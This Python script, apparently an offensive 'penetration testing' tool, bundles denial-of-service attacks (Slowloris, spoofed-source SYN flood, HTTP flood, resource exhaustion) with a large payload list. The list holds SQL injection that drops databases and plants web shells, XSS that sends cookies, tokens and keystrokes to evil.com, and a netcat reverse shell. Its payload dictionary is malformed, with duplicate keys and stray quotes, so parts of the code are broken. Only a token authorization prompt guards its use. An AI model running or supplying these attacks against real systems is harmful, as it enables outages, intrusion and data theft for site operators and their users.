import requests
import threading
import time
import random
import json
import hashlib
import socket
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
from datetime import datetime
import sys
import urllib3
from fake_useragent import UserAgent
import base64
import secrets
import struct
import zlib
import gzip
from io import BytesIO

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ExtremePenetrationTester:
    def __init__(self):
        self.results = []
        self.ua = UserAgent()
        self.attack_stats = {
            'requests_sent': 0,
            'successful_attacks': 0,
            'server_errors': 0,
            'start_time': None
        }
        
    def generate_malicious_payloads(self):
        """Generate extreme payloads untuk testing"""
        payloads = {
            # SQL Injection Extreme
            'sql_injection': [
                      'sql_injection': [
        "admin' OR '1'='1' OR 'x'='x",
        "' OR 1=1-- ",
        "admin'--",
        "' OR '1'='1'/*",
        "admin'/*",
        "' OR 1=1#",
        "' OR '1'='1' -- -",
        "admin' OR 1=1--",
        "' OR 'x'='x';--",
        "x' OR full_name LIKE '%admin%';--",
    ],
    
    # Union-Based Advanced
        'sql_injection': [
        "' UNION SELECT 1,@@version,3,4,5 -- -",
        "' UNION SELECT 1,user(),3,4,5 -- -",
        "' UNION SELECT 1,database(),3,4,5 -- -",
        "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables -- -",
        "' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users' -- -",
        "' UNION SELECT 1,concat(username,0x3a,password),3,4,5 FROM users -- -",
        "' UNION SELECT 1,load_file('/etc/passwd'),3,4,5 -- -",
        "' UNION SELECT 1,password_hash,3,4,5 FROM mysql.user -- -",
    ],
    
    # Error-Based Extreme
            'sql_injection': [
        "' AND extractvalue(rand(),concat(0x3a,version())) -- -",
        "' AND updatexml(rand(),concat(0x3a,version()),rand()) -- -",
        "' OR exp(~(SELECT * FROM (SELECT version())x)) -- -",
        "' AND (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y) -- -",
        "' AND geometrycollection((select * from(select * from(select version())a)b)) -- -",
        "' AND multipoint((select * from(select * from(select version())a)b)) -- -",
        "' AND polygon((select * from(select * from(select version())a)b)) -- -",
        "' AND multipolygon((select * from(select * from(select version())a)b)) -- -",
    ],
    
    # Boolean-Based Blind Advanced
             'sql_injection': [
        "' AND ascii(substring((SELECT version()),1,1))>0 -- -",
        "' AND (SELECT ascii(substring(table_name,1,1)) FROM information_schema.tables LIMIT 1)>0 -- -",
        "' AND (SELECT ascii(substring(column_name,1,1)) FROM information_schema.columns WHERE table_name='users' LIMIT 1)>0 -- -",
        "' AND (SELECT ascii(substring(password,1,1)) FROM users WHERE username='admin')>0 -- -",
        "' AND length((SELECT version()))>0 -- -",
        "' AND (SELECT count(*) FROM information_schema.tables)>0 -- -",
    ],
    
    # Time-Based Blind Extreme
          'sql_injection': [
        "' AND (SELECT * FROM (SELECT(SLEEP(10)))a) -- -",
        "' AND SLEEP(10) -- -",
        "' ; SELECT SLEEP(10); -- -",
        "' OR SLEEP(10) -- -",
        "' AND BENCHMARK(10000000,MD5('test')) -- -",
        "' AND (SELECT count(*) FROM information_schema.tables AS a CROSS JOIN information_schema.tables AS b CROSS JOIN information_schema.tables AS c) -- -",
        "' || pg_sleep(10) -- -",
        "' ; WAITFOR DELAY '00:00:10' -- -",
        "' AND (SELECT count(*) FROM users WHERE username='admin' AND SLEEP(10)) -- -",
    ],
    
    # Stacked Queries Dangerous
         
       'sql_injection': [
        "'; DROP TABLE users; -- -",
        "'; TRUNCATE TABLE logs; -- -",
        "'; DELETE FROM users WHERE 1=1; -- -",
        "'; UPDATE users SET password='hacked' WHERE username='admin'; -- -",
        "'; INSERT INTO users (username, password, email) VALUES ('hacker','pwned','hacker@evil.com'); -- -",
        "'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255); -- -",
        "'; CREATE TABLE pwned (data TEXT); -- -",
        "'; GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%'; -- -",
    ],
    
    # System Command Execution
         'sql_injection': [
        "'; EXEC xp_cmdshell('whoami'); -- -",
        "'; EXEC xp_cmdshell('net user'); -- -",
        "'; EXEC xp_cmdshell('ipconfig'); -- -",
        "'; EXEC xp_cmdshell('dir C:\\\\'); -- -",
        "'; EXEC xp_cmdshell('type C:\\\\windows\\\\win.ini'); -- -",
        "'; EXEC xp_cmdshell('curl http://evil.com/shell.exe -o C:\\\\temp\\\\shell.exe'); -- -",
        "'; EXEC xp_cmdshell('certutil -urlcache -split -f http://evil.com/backdoor.exe C:\\\\backdoor.exe'); -- -",
        "'; EXEC xp_cmdshell('schtasks /create /tn \"Backdoor\" /tr \"C:\\\\backdoor.exe\" /sc minute /mo 1'); -- -",
    ],
    
    # File System Operations
          'sql_injection': [
        "' UNION SELECT 1,load_file('/etc/passwd'),3,4,5 -- -",
        "' UNION SELECT 1,load_file('C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts'),3,4,5 -- -",
        "' UNION SELECT 1,2,3,4,5 INTO OUTFILE '/var/www/html/backdoor.php' -- -",
        "' UNION SELECT '<?php system($_GET[cmd]); ?>',2,3,4,5 INTO OUTFILE '/var/www/html/shell.php' -- -",
        "' UNION SELECT 1,2,3,4,5 INTO DUMPFILE '/usr/lib/backdoor.so' -- -",
        "'; SELECT * FROM mysql.user INTO OUTFILE '/tmp/users.txt' -- -",
    ],
    
    # Database Takeover
        'sql_injection': [
        "'; CREATE USER 'attacker'@'%' IDENTIFIED BY 'password'; -- -",
        "'; GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%'; -- -",
        "'; FLUSH PRIVILEGES; -- -",
        "'; UPDATE mysql.user SET password=PASSWORD('hacked') WHERE user='root'; -- -",
        "'; DROP DATABASE production; -- -",
        "'; ALTER TABLE mysql.user SET plugin='mysql_native_password'; -- -",
    ],
    
    # NoSQL Injection Extreme
         'sql_injection': [
        '{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}',
        '{"$where": "this.username == \'admin\' && this.password == \'admin\'"}',
        '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
        '{"$where": "sleep(5000)"}',
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"$or": [{"username": "admin"}, {"password": "admin"}]}',
    ],
    
    # WAF Bypass Advanced
         'sql_injection': [
        "' /*!50000OR*/ 1=1 -- -",
        "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 -- -",
        "' /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ 1,2,3 -- -",
        "' OR 1=1 -- -",
        "' Or 1=1 -- -",
        "' oR 1=1 -- -",
        "'/**/OR/**/1=1 -- -",
        "'%0AOR%0A1=1 -- -",
        "'%09OR%091=1 -- -",
        "'%0DOR%0D1=1 -- -",
        "'%0COR%0C1=1 -- -",
        "'%0BOR%0B1=1 -- -",
        "' OR+1=1 -- -",
        "' OR-1=1 -- -",
        "' OR@1=1 -- -",
        "' OR!1=1 -- -",
        "' OR`1`=1 -- -",
        "' OR(1)=1 -- -",
        "' OR'1'='1' -- -",
        "' OR'1'='1' -- -",
    ],
    
    # Second-Order Injection Advanced
         'sql_injection': [
        "admin'; INSERT INTO products (name, price) VALUES ('hacked', 0.01); -- -",
        "test'; UPDATE configuration SET value='compromised' WHERE name='admin_email'; -- -",
        "user'; DELETE FROM audit_trail WHERE 1=1; -- -",
        "guest'; CREATE TABLE stolen_data (id INT, data TEXT); -- -",
        "'; INSERT INTO backups (data) SELECT * FROM credit_cards; -- -",
    ],
    
    # ORM Injection
         'sql_injection': [
        "'; OR 1=1 -- -",
        "' OR 1=1) -- -",
        "') OR ('1'='1' -- -",
        "' OR '1'='1')) -- -",
        "' OR 1=1 LIMIT 1 -- -",
        "' OR 1=1 OFFSET 0 -- -",
    ],
    
    # LDAP Injection
         'sql_injection': [
        "*)(&",
        "*))%00",
        ")(cn=*))",
        "*)(|(objectclass=*",
        "*)(uid=*))(|(uid=*",
    ]'

            # XSS Extreme
                  'xss': [
                "<script>while(true){alert('XSS')}</script>",
                "<img src=x onerror=\"javascript:while(true){window.open('http://malicious.com')}\">",
                "<body onload=\"document.body.innerHTML='<iframe src=http://malicious.com></iframe>'\">"
                     "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>",
        "<script>var i=new Image();i.src='http://evil.com/?data='+localStorage.getItem('token')</script>",
        "<script>navigator.credentials.get({password:true}).then(c=>{fetch('http://evil.com/pwd',{method:'POST',body:JSON.stringify(c)})})</script>",
        "<script>document.forms[0].addEventListener('submit',function(e){fetch('http://evil.com/form',{method:'POST',body:new FormData(this)})})</script>",
           "<script>document.onkeypress=function(e){fetch('http://evil.com/keys?k='+e.key)</script>",
        "<script>document.addEventListener('keydown',e=>{localStorage.setItem('keys',(localStorage.getItem('keys')||'')+e.key)})</script>",
              "<script>while(true){for(let i=0;i<1000000;i++){Math.sqrt(i)}}</script>",
        "<script>setInterval(()=>{let start=Date.now();while(Date.now()-start<1000){}},1)</script>",
                 "<script>let a=[];while(true){a.push(new Array(1000000))}</script>",
        "<script>for(;;){document.write('<div>'+'A'.repeat(1000000)+'</div>')}</script>",
                "<script>while(true){window.open('http://malicious.com')}</script>",
        "<script>setInterval(()=>{window.open(window.location)},100)</script>",
        "<script>while(true){alert('CRASH')}</script>",
        "<script>document.body.innerHTML=''</script>",
        "<script>window.location='about:blank'</script>",
                    "<script>localStorage.setItem('malicious','<script>alert(1)</script>')</script>",
        "<script>sessionStorage.setItem('payload','<img src=x onerror=alert(1)>')</script>",
        
        
        "<script>document.cookie='malicious=<script>alert(1)</script>;path=/'</script>",
        
        
        "<script>fetch('/api/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({comment:'<script>alert(1)</script>'})})</script>",    
                   "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        
        # Case variation
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
        
        # Whitespace tricks
        "<script/ src=http://evil.com/xss.js>",
        "<script\n>alert(1)</script>",
        "<script\t>alert(1)</script>",
        "<script>alert(1)</script\0>",
        "<img src=x onerror=alert(1)\0>",     
                
                 "<script>var script=document.createElement('script');script.src='https://coinhive.com/lib/miner.js';document.head.appendChild(script);script.onload=function(){var miner=new CoinHive.Anonymous('KEY');miner.start()}</script>",
        "<script>import('https://xmr.miner.com/script.js').then(m=>m.startMining())</script>", 
              "<script>document.cookie='malicious=<script>alert(1)</script>;path=/'</script>",
                     "<script>localStorage.setItem('malicious','<script>alert(1)</script>')</script>",
        "<script>sessionStorage.setItem('payload','<img src=x onerror=alert(1)>')</script>",
                "<script>fetch('/api/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({comment:'<script>alert(1)</script>'})})</script>",
                        "<script>var ws=new WebSocket('ws://evil.com:8080');ws.onopen=function(){ws.send(document.cookie)}</script>",
        "<script>var ws=new WebSocket('ws://localhost:9222');ws.onmessage=function(e){eval(e.data)}</script>",
                    "<iframe src='javascript:alert(1)'></iframe>",
        "<iframe src='http://evil.com' onload='alert(1)'></iframe>",
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
                "<script>while(true){window.open('http://malicious.com')}</script>",
        "<script>setInterval(()=>{window.open(window.location)},100)</script>",
        "<script>while(true){alert('CRASH')}</script>",
        "<script>document.body.innerHTML=''</script>",
        "<script>window.location='about:blank'</script>",
    ],
            # Buffer Overflow Extreme
            'buffer_overflow': [
                "A" * 100000,  # 100KB payload
                "A" * 500000,  # 500KB payload  
                "A" * 1000000, # 1MB payload
                "%n" * 10000,  # Format string
                "\x00" * 50000 # Null bytes
            ],
            # Command Injection Extreme
            'command_injection': [
                "; cat /etc/passwd | mail attacker@evil.com",
                "| wget http://malicious.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
                "&& curl -X POST -d @/etc/shadow http://attacker.com/steal",
                "; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 >/tmp/f"
            ]
        }
        return payloads

    def create_slowloris_attack(self, target_host, target_port=80, sockets_count=500):
        """Slowloris DDoS Attack"""
        print(f"🐌 Starting Slowloris attack on {target_host}:{target_port}")
        
        sockets = []
        
        # Create multiple partial connections
        for i in range(sockets_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_host, target_port))
                
                # Send partial HTTP request
                s.send(f"POST / HTTP/1.1\r\nHost: {target_host}\r\n".encode())
                s.send(f"User-Agent: {self.ua.random}\r\n".encode())
                s.send(f"Content-Length: 1000000\r\n".encode())
                
                sockets.append(s)
                print(f"🔧 Slowloris socket {i+1} connected")
                
            except Exception as e:
                print(f"❌ Socket {i+1} failed: {e}")
        
        # Keep connections alive
        print("🕐 Keeping connections alive...")
        time.sleep(300)  # Keep for 5 minutes
        
        # Cleanup
        for s in sockets:
            try:
                s.close()
            except:
                pass

    def create_http_flood(self, url, num_requests=10000, num_threads=3000):
        """High-speed HTTP Flood Attack"""
        print(f"🌊 Starting HTTP Flood: {num_requests} requests with {num_threads} threads")
        
        session = requests.Session()
        session.verify = False
        
        def flood_worker(worker_id):
            local_count = 0
            for i in range(num_requests // num_threads):
                try:
                    # Generate malicious payload
                    payloads = self.generate_malicious_payloads()
                    random_payload = random.choice(
                        payloads['sql_injection'] + 
                        payloads['xss'] + 
                        payloads['buffer_overflow']
                    )
                    
                    headers = {
                        'User-Agent': self.ua.random,
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive'
                    }
                    
                    # Randomly choose attack type
                    attack_type = random.choice(['get', 'post', 'head'])
                    
                    if attack_type == 'get':
                        response = session.get(
                            f"{url}?q={random_payload}&cache={random.randint(100000,999999)}",
                            headers=headers,
                            timeout=5
                        )
                    elif attack_type == 'post':
                        response = session.post(
                            url,
                            data={'data': random_payload, 'test': 'x' * 10000},
                            headers=headers,
                            timeout=5
                        )
                    else:  # head
                        response = session.head(url, headers=headers, timeout=5)
                    
                    local_count += 1
                    self.attack_stats['requests_sent'] += 1
                    
                    if response.status_code >= 500:
                        self.attack_stats['server_errors'] += 1
                        print(f"💥 Server error: {response.status_code}")
                    
                    if local_count % 50 == 0:
                        print(f"📦 Worker {worker_id}: Sent {local_count} requests")
                        
                except Exception as e:
                    if "Max retries" in str(e) or "Connection" in str(e):
                        self.attack_stats['server_errors'] += 1
                        print(f"🎯 Possible server overload: {e}")
        
        # Start all threads
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(flood_worker, i) for i in range(num_threads)]
            
            for future in as_completed(futures):
                future.result()

    def create_tcp_syn_flood(self, target_ip, target_port=80, duration=60):
        """TCP SYN Flood Attack"""
        print(f"🌪️ Starting TCP SYN Flood on {target_ip}:{target_port} for {duration}s")
        
        # Create IP header
        def create_ip_header(source_ip, dest_ip):
            version_ihl = 69  # Version 4, IHL 5
            type_of_service = 0
            total_length = 40  # IP header + TCP header
            identification = random.randint(1, 65535)
            flags_fragment = 0
            ttl = 255
            protocol = 6  # TCP
            checksum = 0
            
            source_ip_bytes = socket.inet_aton(source_ip)
            dest_ip_bytes = socket.inet_aton(dest_ip)
            
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                  version_ihl, type_of_service, total_length,
                                  identification, flags_fragment, ttl, protocol,
                                  checksum, source_ip_bytes, dest_ip_bytes)
            return ip_header

        # Create TCP header
        def create_tcp_header(source_port, dest_port, seq_num, ack_num, window=5840):
            data_offset_reserved = 80  # Data offset 5, reserved 0
            flags = 2  # SYN flag
            checksum = 0
            urg_ptr = 0
            
            tcp_header = struct.pack('!HHLLBBHHH',
                                   source_port, dest_port, seq_num, ack_num,
                                   data_offset_reserved, flags, window,
                                   checksum, urg_ptr)
            return tcp_header

        end_time = time.time() + duration
        packet_count = 0
        
        # Create raw socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            print("❌ Need root privileges for raw socket")
            return

        while time.time() < end_time:
            try:
                # Generate random source IP and port
                source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                source_port = random.randint(1024, 65535)
                
                ip_header = create_ip_header(source_ip, target_ip)
                tcp_header = create_tcp_header(source_port, target_port, random.randint(1, 4294967295), 0)
                
                packet = ip_header + tcp_header
                s.sendto(packet, (target_ip, 0))
                
                packet_count += 1
                
                if packet_count % 1000 == 0:
                    print(f"📦 SYN packets sent: {packet_count}")
                    
            except Exception as e:
                print(f"❌ SYN flood error: {e}")
                break
        
        print(f"✅ SYN Flood completed: {packet_count} packets sent")

    def create_resource_exhaustion(self, url, num_threads=50):
        """Resource Exhaustion Attack"""
        print(f"💀 Starting Resource Exhaustion Attack")
        
        def exhaust_worker(worker_id):
            session = requests.Session()
            session.verify = False
            
            while True:
                try:
                    # Send large files
                    large_data = 'x' * random.randint(100000, 500000)  # 100KB-500KB
                    
                    # Multiple concurrent large requests
                    headers = {
                        'User-Agent': self.ua.random,
                        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW',
                        'Content-Length': str(len(large_data) + 200)
                    }
                    
                    response = session.post(
                        url,
                        data=large_data,
                        headers=headers,
                        timeout=30
                    )
                    
                    self.attack_stats['requests_sent'] += 1
                    
                    print(f"📦 Worker {worker_id}: Sent large payload")
                    
                except Exception as e:
                    print(f"💥 Worker {worker_id}: {e}")
        
        # Start exhaustion threads
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=exhaust_worker, args=(i+1,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Run for 10 minutes
        time.sleep(600)
        
        print("✅ Resource exhaustion completed")

    def run_comprehensive_attack(self, target_url, attack_duration=300):
        """Run all attacks simultaneously"""
        print(f"🎯 Starting Comprehensive Penetration Test")
        print(f"⏰ Duration: {attack_duration} seconds")
        print(f"🎯 Target: {target_url}")
        print("=" * 60)
        
        self.attack_stats['start_time'] = time.time()
        
        # Parse target
        if '://' in target_url:
            target_host = target_url.split('://')[1].split('/')[0]
        else:
            target_host = target_url.split('/')[0]
        
        target_port = 80
        if ':' in target_host:
            target_host, target_port = target_host.split(':')
            target_port = int(target_port)
        
        # Start all attacks in separate threads
        attack_threads = []
        
        # HTTP Flood
        http_thread = threading.Thread(
            target=self.create_http_flood, 
            args=(target_url, 50000, 200)
        )
        attack_threads.append(http_thread)
        
        # TCP SYN Flood
        syn_thread = threading.Thread(
            target=self.create_tcp_syn_flood,
            args=(target_host, target_port, attack_duration)
        )
        attack_threads.append(syn_thread)
        
        # Resource Exhaustion
        resource_thread = threading.Thread(
            target=self.create_resource_exhaustion,
            args=(target_url, 100)
        )
        attack_threads.append(resource_thread)
        
        # Start all attacks
        for thread in attack_threads:
            thread.daemon = True
            thread.start()
        
        # Monitor progress
        start_time = time.time()
        while time.time() - start_time < attack_duration:
            elapsed = time.time() - start_time
            remaining = attack_duration - elapsed
            
            print(f"⏱️  Elapsed: {elapsed:.1f}s | Remaining: {remaining:.1f}s | "
                  f"Requests: {self.attack_stats['requests_sent']} | "
                  f"Server Errors: {self.attack_stats['server_errors']}")
            
            time.sleep(5)
        
        print("=" * 60)
        print("🎯 PENETRATION TEST COMPLETED")
        print(f"📊 Total Requests Sent: {self.attack_stats['requests_sent']}")
        print(f"💥 Server Errors: {self.attack_stats['server_errors']}")
        print(f"⏱️  Total Duration: {time.time() - self.attack_stats['start_time']:.1f}s")
        
        # Effectiveness analysis
        error_rate = (self.attack_stats['server_errors'] / max(1, self.attack_stats['requests_sent'])) * 100
        print(f"📈 Server Error Rate: {error_rate:.2f}%")
        
        if error_rate > 50:
            print("🎯 RESULT: HIGH IMPACT - Server likely overwhelmed")
        elif error_rate > 20:
            print("🎯 RESULT: MEDIUM IMPACT - Server showing stress")
        else:
            print("🎯 RESULT: LOW IMPACT - Server handling load well")

def main():
    parser = argparse.ArgumentParser(description='🔥 Extreme Penetration Testing Tool - RESEARCH ONLY')
    parser.add_argument('target', help='Target URL or IP address')
    parser.add_argument('-d', '--duration', type=int, default=300, 
                       help='Attack duration in seconds (default: 300)')
    parser.add_argument('--mode', choices=['http_flood', 'syn_flood', 'slowloris', 'comprehensive'], 
                       default='comprehensive', help='Attack mode')
    
    args = parser.parse_args()
    
    # WARNING
    print("🚨 WARNING: This tool is for RESEARCH and AUTHORIZED TESTING ONLY!")
    print("🚨 Illegal use is strictly prohibited!")
    print("🚨 You are responsible for complying with all applicable laws!")
    
    confirm = input("❓ Do you have authorization to test this target? (yes/NO): ")
    if confirm.lower() != 'yes':
        print("❌ Operation cancelled")
        return
    
    tester = ExtremePenetrationTester()
    
    try:
        if args.mode == 'http_flood':
            tester.create_http_flood(args.target, 10000, 100)
        elif args.mode == 'syn_flood':
            target_host = args.target.split('://')[1] if '://' in args.target else args.target
            tester.create_tcp_syn_flood(target_host, 80, args.duration)
        elif args.mode == 'slowloris':
            target_host = args.target.split('://')[1] if '://' in args.target else args.target
            tester.create_slowloris_attack(target_host, 80, 500)
        else:
            tester.run_comprehensive_attack(args.target, args.duration)
            
    except KeyboardInterrupt:
        print("\n🛑 Attack stopped by user")
    except Exception as e:
        print(f"💥 Critical error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    # Required: Run with administrator privileges
    # pip install requests fake-useragent urllib3
    
    main()